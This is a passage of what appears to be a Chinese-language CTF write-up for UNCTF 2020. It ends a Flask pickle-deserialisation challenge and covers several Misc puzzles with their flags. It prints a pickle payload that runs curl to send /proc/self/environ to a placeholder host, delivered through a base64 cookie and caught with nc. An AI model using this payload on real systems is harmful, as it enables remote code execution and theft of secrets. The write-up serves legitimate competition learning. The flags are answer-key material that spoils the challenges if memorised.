+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if session.get(&#39;name&#39;):</span><br><span class="line">    if b&#39;R&#39; in base64.b64decode(request.cookies[&#39;pkl&#39;]):</span><br><span class="line">        return &quot;RCE??&quot;</span><br><span class="line">    person &#x3D; pickle.loads(base64.b64decode(request.cookies[&#39;pkl&#39;]))</span><br></pre></td></tr></table></figure>
+
+<p>從參考處獲取不含 <code>R</code> 的 payload，因為沒有回顯，所以構造一個 curl 請求來從服務端使用 <code>nc</code> 監聽來獲取檔案內容。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#39;&#39;&#39;(S&#39;curl  -F &quot;filename&#x3D;@&#x2F;proc&#x2F;self&#x2F;environ&quot; YOUR_HOST&#39;</span><br><span class="line">ios</span><br><span class="line">system</span><br><span class="line">.&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>
+
+<p>按照題目的方式，在登陸後定向到 <code>/login</code> 路由後，將 payload base64 編碼後設置到 <code>pkl</code> cookie。重新整理頁面，即可在監聽處獲取到環境變數的內容，其中包含 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123024658.c30471900b24d94744e84eabb6cfcc2e9e4a2394.png" alt="image-20201115230937913"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;a1b56cec-8b90-4e22-a8e1-98069088bb13&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="陰陽人編碼"><a href="#陰陽人編碼" class="headerlink" title="陰陽人編碼"></a>陰陽人編碼</h3><p>將 <code>就這</code> <code>不會吧</code> 都替換成 <code>Ook</code> 並整理符號後得到如下文字。</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line">Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook.</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook?</span><br><span class="line">Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook?</span><br><span class="line">Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!</span><br><span class="line">Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?</span><br><span class="line">Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook.</span><br><span class="line">Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!</span><br><span class="line">Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook?</span><br><span class="line">Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.</span><br><span class="line">Ook. Ook. Ook! Ook. Ook? Ook. </span><br></pre></td></tr></table></figure>
+
+<p>將其解碼後得到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;9_zhe_Jiu_zhe_8_hui_8&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="YLB’s-CAPTCHA-簽到題"><a href="#YLB’s-CAPTCHA-簽到題" class="headerlink" title="YLB’s CAPTCHA - 簽到題"></a>YLB’s CAPTCHA - 簽到題</h3><p>驗證碼圖片截下來，PS 調整色階到能看得很清的程度，然後輸入驗證碼，積累十個正確提交得到 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123272140.ff1b9e10381366286020a6f8b504080bb2938ac0.png" alt="image-20201115233514388"></p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123502272.c6fa4cc694961b245795b54f5f2229cb5e397cc1.png" alt="image-20201115233125644"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;cc95bcb8-f09e-4134-82d2-cb4446d5d93f&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="baba-is-you"><a href="#baba-is-you" class="headerlink" title="baba_is_you"></a>baba_is_you</h3><p>010editor 開啟檔案，發現其尾部有一個連結。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/5709d358-adaf-4c68-8082-1e36bea7de8c/1613214123625996.abd50ca76fc3fe323cfc90102204b333cc8981fe.png" alt="image-20201115232547446"></p>
+<p>訪問連結，在 B 站評論區找到 flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unctf&#123;let&#39;s_study_pwn&#125;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首頁</a></li>
+         
+          <li><a href="/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-ssrf"><span class="toc-number">1.1.</span> <span class="toc-text">easy_ssrf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babyeval"><span class="toc-number">1.2.</span> <span class="toc-text">babyeval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UN%E2%80%99s-online-tools"><span class="toc-number">1.3.</span> <span class="toc-text">UN’s_online_tools</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyflask"><span class="toc-number">1.4.</span> <span class="toc-text">easyflask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-number">1.5.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyunserialize"><span class="toc-number">1.6.</span> <span class="toc-text">easyunserialize</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyphp"><span class="toc-number">1.7.</span> <span class="toc-text">easyphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin-sql"><span class="toc-number">1.8.</span> <span class="toc-text">checkin-sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-flask2"><span class="toc-number">1.9.</span> <span class="toc-text">easy_flask2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%B0%E9%99%BD%E4%BA%BA%E7%B7%A8%E7%A2%BC"><span class="toc-number">2.1.</span> <span class="toc-text">陰陽人編碼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#YLB%E2%80%99s-CAPTCHA-%E7%B0%BD%E5%88%B0%E9%A1%8C"><span class="toc-number">2.2.</span> <span class="toc-text">YLB’s CAPTCHA - 簽到題</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baba-is-you"><span class="toc-number">2.3.</span> <span class="toc-text">baba_is_you</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/774f8257.html"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&text=UNCTF 2020"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&is_video=false&description=UNCTF 2020"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=UNCTF 2020&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/774f8257.html"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&title=UNCTF 2020"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/774f8257.html&name=UNCTF 2020&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/774f8257.html&t=UNCTF 2020"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 選單</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 文章目錄</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 頁首</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+        
+        
+        <li>
+        
+          <a href="/zh-CN">简</a>
+        
+          <a href="/en">En</a>
+        
+          <a href="#">正</a>
+        
+        </li>
+      </ul>
+    </nav>
+  </div>
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018-2021
+    LemonPrefect
+    湘ICP备20002800号
+    
+      <img src="/images/beian.png"/>
+      湘公网安备43021102000188号
+    
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
